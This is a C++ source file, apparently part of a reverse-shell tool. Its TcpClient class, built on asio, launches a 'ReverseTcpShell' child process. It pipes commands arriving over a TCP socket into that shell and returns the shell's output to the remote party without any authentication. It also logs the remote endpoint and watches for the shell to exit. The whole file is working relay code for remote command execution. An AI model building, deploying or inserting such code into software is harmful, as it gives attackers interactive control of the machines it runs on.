#include "TcpClient.h"

#include <iterator>
#include <sstream>

#include <sys/wait.h>

namespace
{

void RemoveCtrlChars(std::string& s)
{
    s.erase(std::remove_if(s.begin(), s.end(),
        [](char c)
        {
            const bool isNewLine = ('\n' == c);
            const bool shouldRemove = std::iscntrl(c) && !isNewLine;
            return shouldRemove;
        }), s.end());
}

std::string ConnectionString(const asio::ip::tcp::socket &socket)
{
    std::ostringstream ss;

    try
    {
        if (socket.is_open())
            ss << socket.remote_endpoint().address().to_string() << ":" << socket.remote_endpoint().port();
    }
    catch(const std::exception& e)
    {
    }

    return ss.str();
}

} // namespace

const asio::chrono::milliseconds TcpClient::CHILD_WATCH_TIMER_DURATION = asio::chrono::milliseconds(100);

TcpClient::TcpClient(asio::io_context &ioContext) :
    m_ioContext(ioContext),
    m_socket(m_ioContext),
    m_childWatchTimer(m_ioContext, CHILD_WATCH_TIMER_DURATION)
{
    // const asio::socket_base::keep_alive keepAliveOption(true);
    // m_socket.set_option(keepAliveOption);
}

TcpClient::~TcpClient()
{
}

void TcpClient::Start()
{
    m_pReverseTcpShellTask.reset(new Task::ReverseTcpShell(m_ioContext));

    ReadFromSocket();
    ReadFromShell();

    if (!m_pReverseTcpShellTask->Start())
    {
        std::cout << ConnectionString(m_socket) << " - unable to start shell." << '\n';

        Cancel();
    }
    else
    {
        std::cout << ConnectionString(m_socket) << " - started shell." << '\n';
        
        m_childWatchTimer.async_wait(std::bind(&TcpClient::CheckShellAlive, shared_from_this(), std::placeholders::_1));
    }
}

asio::ip::tcp::socket &TcpClient::GetSocket()
{
    return m_socket;
}

void TcpClient::Cancel()
{
    m_socket.cancel();
    m_childWatchTimer.cancel();
    m_pReverseTcpShellTask.reset();
}

void TcpClient::WriteToSocket(const std::string &message)
{
    asio::async_write(GetSocket(), asio::buffer(message),
        std::bind(&TcpClient::OnWriteToSocket, shared_from_this(), std::placeholders::_1, std::placeholders::_2));
}

void TcpClient::OnWriteToSocket(const asio::error_code &error, const size_t nBytesTransferred)
{
    if (error)
    {
        std::cout << ConnectionString(m_socket) << " - OnWriteToSocket error: " << error.message() << '\n';
        return;
    }
}

void TcpClient::ReadFromSocket()
{
    asio::async_read_until(GetSocket(), m_socketInputBuffer, "\n",
        std::bind(&TcpClient::OnReadFromSocket, shared_from_this(), std::placeholders::_1, std::placeholders::_2));
}

void TcpClient::OnReadFromSocket(const asio::error_code &error, const size_t nBytesTransferred)
{
    if (error)
    {
        if (asio::error::operation_aborted != error.value())
            std::cout << ConnectionString(m_socket) << " - OnReadFromSocket error: " << error.message() << '\n';

        return;
    }

    std::string message = std::string(std::istreambuf_iterator<char>(&m_socketInputBuffer), std::istreambuf_iterator<char>());
    RemoveCtrlChars(message);

    WriteToShell(message);

    ReadFromSocket();
}

void TcpClient::WriteToShell(const std::string &message)
{
    asio::async_write(m_pReverseTcpShellTask->GetParentSocket(), asio::buffer(message),
        std::bind(&TcpClient::OnWriteToShell, shared_from_this(), std::placeholders::_1, std::placeholders::_2));
}

void TcpClient::OnWriteToShell(const asio::error_code &error, const size_t nBytesTransferred)
{
    if (error)
    {
        std::cout << ConnectionString(m_socket) << " - OnWriteToShell error=" << error.message() << '\n';
        return;
    }
}

void TcpClient::ReadFromShell()
{
    // asio::async_read_until(m_pReverseTcpShellTask->GetParentSocket(), m_shellInputBuffer, "\n",
        // std::bind(&TcpClient::OnReadFromShell, shared_from_this(), std::placeholders::_1, std::placeholders::_2));
    
    m_pReverseTcpShellTask->GetParentSocket().async_read_some(asio::buffer(m_shellInputBuffer, m_shellInputBuffer.size()),
        std::bind(&TcpClient::OnReadFromShell, shared_from_this(), std::placeholders::_1, std::placeholders::_2));
}

void TcpClient::OnReadFromShell(const asio::error_code &error, const size_t nBytesTransferred)
{
    if (error)
    {
        if (asio::error::operation_aborted != error.value())
            std::cout << ConnectionString(m_socket) << " - OnReadFromShell error=" << error.message() << '\n';

        return;
    }

    // std::string message = std::string(std::istreambuf_iterator<char>(&m_shellInputBuffer), std::istreambuf_iterator<char>());
    std::string message;
    message.assign(m_shellInputBuffer.data(), nBytesTransferred);
    
    // RemoveCtrlChars(message);

    WriteToSocket(message);

    ReadFromShell();
}

void TcpClient::CheckShellAlive(const asio::error_code &error)
{
    if (!m_pReverseTcpShellTask)
    {
        m_childWatchTimer.expires_at(m_childWatchTimer.expiry() + CHILD_WATCH_TIMER_DURATION);
        m_childWatchTimer.async_wait(std::bind(&TcpClient::CheckShellAlive, shared_from_this(), std::placeholders::_1));
        return;
    }

    if (m_pReverseTcpShellTask->HasShellTerminated())
    {
        //! Child terminated.
        std::cout << ConnectionString(m_socket) << " - shell child terminated, pid=" << m_pReverseTcpShellTask->GetShellPid() << '\n';
        
        Cancel();
    }
    else
    {
        m_childWatchTimer.expires_at(m_childWatchTimer.expiry() + CHILD_WATCH_TIMER_DURATION);
        m_childWatchTimer.async_wait(std::bind(&TcpClient::CheckShellAlive, shared_from_this(), std::placeholders::_1));
    }
}

TcpClient::Pointer TcpClient::Create(asio::io_context &ioContext)
{
    return Pointer(new TcpClient(ioContext));
}
